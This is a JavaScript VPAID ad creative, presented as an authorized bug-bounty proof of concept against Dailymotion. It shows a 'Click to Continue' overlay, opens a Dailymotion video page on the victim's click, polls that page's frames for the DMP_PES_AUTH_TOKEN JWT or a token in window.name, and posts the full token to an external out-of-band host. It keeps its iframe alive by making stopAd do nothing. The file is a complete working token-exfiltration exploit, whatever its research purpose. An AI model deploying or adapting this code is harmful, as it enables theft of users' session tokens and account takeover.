/**
 * Stage B VPAID — authorized YWH BBP PoC (ivan0912)
 *
 * Full-slot "click to continue" creative. On victim click inside the ad slot:
 * 1. window.open to www.dailymotion.com/video/<xid>
 * 2. Poll w[i].DMP_PES_AUTH_TOKEN from the same-origin geo player iframe
 * 3. POST {sub, alg, iss, len, token} to the OOB receiver
 *
 * stopAd is a no-op so the VPAID iframe survives.
 * The window.open handle is stored on window.parent (the player frame).
 */
(function() {
  var OOB = "https://fdd8cd2afcd551371c9536pctzhzgxxyc.oob.static-cdn-eu.com/stage-b-token";
  var VIDEO_XID = "x8uod1c";

  function VpaidAd() {
    this._slot = null;
    this._evtCallbacks = {};
  }

  VpaidAd.prototype.handshakeVersion = function(v) { return "2.0"; };

  VpaidAd.prototype.initAd = function(w, h, vm, d, e, p) {
    this._slot = p.slot;
    var self = this;

    // Full-slot overlay with click target
    this._slot.innerHTML =
      '<div id="vpaid-click-overlay" style="' +
        'position:absolute;top:0;left:0;right:0;bottom:0;' +
        'background:rgba(0,0,0,0.9);display:flex;align-items:center;' +
        'justify-content:center;cursor:pointer;z-index:99999">' +
        '<div style="text-align:center;color:#fff;font-family:sans-serif">' +
          '<div style="font-size:28px;margin-bottom:20px;font-weight:600">Advertisement</div>' +
          '<div id="vpaid-btn" style="' +
            'font-size:18px;padding:14px 32px;background:#1a73e8;' +
            'border-radius:8px;cursor:pointer;display:inline-block;' +
            'transition:background 0.2s">Click to Continue</div>' +
          '<div style="font-size:11px;margin-top:16px;opacity:0.5">' +
            'Authorized security research — YWH ivan0912</div>' +
        '</div>' +
      '</div>';

    var overlay = this._slot.querySelector("#vpaid-click-overlay");
    overlay.addEventListener("click", function onUserClick() {
      overlay.removeEventListener("click", onUserClick);

      // Update UI
      var btn = self._slot.querySelector("#vpaid-btn");
      if (btn) {
        btn.textContent = "Opening...";
        btn.style.background = "#666";
      }

      // Open www video page in a popup (requires user activation from the click)
      var wwwUrl = "https://www.dailymotion.com/video/" + VIDEO_XID;
      var wwwWin;
      try {
        wwwWin = window.open(wwwUrl);
      } catch(err) {
        sendOOB({error: "window.open failed", msg: String(err)});
        return;
      }

      if (!wwwWin) {
        sendOOB({error: "popup_blocked", note: "window.open returned null — popup was blocked"});
        return;
      }

      // Store handle on window.parent (the player frame) so it survives VPAID teardown
      try { window.parent.__stage_b_handle = wwwWin; } catch(e) {}

      if (btn) btn.textContent = "Waiting for token...";

      // Poll for the token in same-origin frames of the opened window
      var attempts = 0;
      var maxAttempts = 120; // 60 seconds at 500ms interval
      var pollId = setInterval(function() {
        attempts++;
        if (attempts > maxAttempts) {
          clearInterval(pollId);
          sendOOB({error: "timeout", attempts: attempts, note: "token not found after " + (attempts * 500) + "ms"});
          if (btn) btn.textContent = "Timeout — no token found";
          return;
        }

        try {
          if (!wwwWin || wwwWin.closed) {
            clearInterval(pollId);
            sendOOB({error: "window_closed", attempts: attempts});
            return;
          }

          var frameCount = 0;
          try { frameCount = wwwWin.length; } catch(e) {}

          // Scan frames for same-origin geo player iframe
          for (var i = 0; i < frameCount; i++) {
            try {
              var token = wwwWin[i].DMP_PES_AUTH_TOKEN;
              if (token && typeof token === "string" && token.length > 100) {
                clearInterval(pollId);

                // Parse JWT
                var parts = token.split(".");
                var headerJson = "{}";
                var payloadJson = "{}";
                try { headerJson = atob(parts[0]); } catch(e) {}
                try {
                  // Handle base64url
                  var b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
                  while (b64.length % 4) b64 += "=";
                  payloadJson = atob(b64);
                } catch(e) {}

                var header = {};
                var payload = {};
                try { header = JSON.parse(headerJson); } catch(e) {}
                try { payload = JSON.parse(payloadJson); } catch(e) {}

                // Also read window.name for confirmation
                var wname = "";
                var wnameHasToken = false;
                try {
                  wname = wwwWin[i].name;
                  wnameHasToken = wname && wname.indexOf("pesAuthToken") !== -1;
                } catch(e) {}

                sendOOB({
                  found: true,
                  source: "DMP_PES_AUTH_TOKEN",
                  frame_index: i,
                  sub: payload.sub || null,
                  alg: header.alg || null,
                  iss: payload.iss || null,
                  atp: payload.atp || null,
                  iat: payload.iat || null,
                  exp: payload.exp || null,
                  len: token.length,
                  token: token,
                  window_name_has_token: wnameHasToken,
                  window_name_len: wname ? wname.length : 0,
                  attempts: attempts,
                  origin: location.origin
                });

                if (btn) {
                  btn.textContent = "Token captured (sub=" + (payload.sub || "?") + ")";
                  btn.style.background = "#0a0";
                }
                return;
              }
            } catch(e) {
              // Cross-origin frame — expected for non-geo frames
            }
          }

          // Also try window.name as backup path
          for (var j = 0; j < frameCount; j++) {
            try {
              var wn = wwwWin[j].name;
              if (wn && wn.indexOf("pesAuthToken") !== -1) {
                // Found token in window.name — extract it
                var decoded = "";
                try { decoded = decodeURIComponent(wn); } catch(e) { decoded = wn; }
                var match = decoded.match(/"pesAuthToken":"([^"]+)"/);
                if (match && match[1] && match[1].length > 100) {
                  clearInterval(pollId);

                  var tkn = match[1];
                  var tparts = tkn.split(".");
                  var th = {}, tp = {};
                  try { th = JSON.parse(atob(tparts[0])); } catch(e) {}
                  try {
                    var b = tparts[1].replace(/-/g, "+").replace(/_/g, "/");
                    while (b.length % 4) b += "=";
                    tp = JSON.parse(atob(b));
                  } catch(e) {}

                  sendOOB({
                    found: true,
                    source: "window.name",
                    frame_index: j,
                    sub: tp.sub || null,
                    alg: th.alg || null,
                    iss: tp.iss || null,
                    atp: tp.atp || null,
                    iat: tp.iat || null,
                    exp: tp.exp || null,
                    len: tkn.length,
                    token: tkn,
                    window_name_len: wn.length,
                    attempts: attempts,
                    origin: location.origin
                  });

                  if (btn) {
                    btn.textContent = "Token captured via window.name (sub=" + (tp.sub || "?") + ")";
                    btn.style.background = "#0a0";
                  }
                  return;
                }
              }
            } catch(e) {}
          }

          // Status update
          if (btn && attempts % 10 === 0) {
            btn.textContent = "Scanning frames... (" + attempts + "/" + maxAttempts + ", frames=" + frameCount + ")";
          }
        } catch(e) {
          // Top-level error in poll
        }
      }, 500);
    });

    this._fire("AdLoaded");
  };

  function sendOOB(data) {
    data.ts = new Date().toISOString();
    data.poc = "stage-b-vpaid-token-read";
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", OOB, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify(data));
    } catch(e) {}
    // Backup: navigator.sendBeacon
    try {
      navigator.sendBeacon(OOB, JSON.stringify(data));
    } catch(e) {}
  }

  // VPAID 2.0 interface stubs
  VpaidAd.prototype.startAd = function() { this._fire("AdStarted"); };
  VpaidAd.prototype.stopAd = function() { /* NO-OP: keep the VPAID iframe alive */ };
  VpaidAd.prototype.skipAd = function() {};
  VpaidAd.prototype.resizeAd = function(w, h, vm) { this._fire("AdSizeChange"); };
  VpaidAd.prototype.pauseAd = function() { this._fire("AdPaused"); };
  VpaidAd.prototype.resumeAd = function() { this._fire("AdPlaying"); };
  VpaidAd.prototype.expandAd = function() {};
  VpaidAd.prototype.collapseAd = function() {};

  VpaidAd.prototype.subscribe = function(fn, evt) { this._evtCallbacks[evt] = fn; };
  VpaidAd.prototype.unsubscribe = function(fn, evt) { delete this._evtCallbacks[evt]; };
  VpaidAd.prototype._fire = function(evt) {
    if (this._evtCallbacks[evt]) {
      try { this._evtCallbacks[evt](); } catch(e) {}
    }
  };

  // Required VPAID 2.0 property getters
  VpaidAd.prototype.getAdLinear = function() { return true; };
  VpaidAd.prototype.getAdWidth = function() { return 640; };
  VpaidAd.prototype.getAdHeight = function() { return 360; };
  VpaidAd.prototype.getAdExpanded = function() { return false; };
  VpaidAd.prototype.getAdSkippableState = function() { return false; };
  VpaidAd.prototype.getAdRemainingTime = function() { return -1; };
  VpaidAd.prototype.getAdDuration = function() { return 30; };
  VpaidAd.prototype.getAdVolume = function() { return 1; };
  VpaidAd.prototype.setAdVolume = function() {};
  VpaidAd.prototype.getAdCompanions = function() { return ""; };
  VpaidAd.prototype.getAdIcons = function() { return false; };

  window.getVPAIDAd = function() { return new VpaidAd(); };
})();
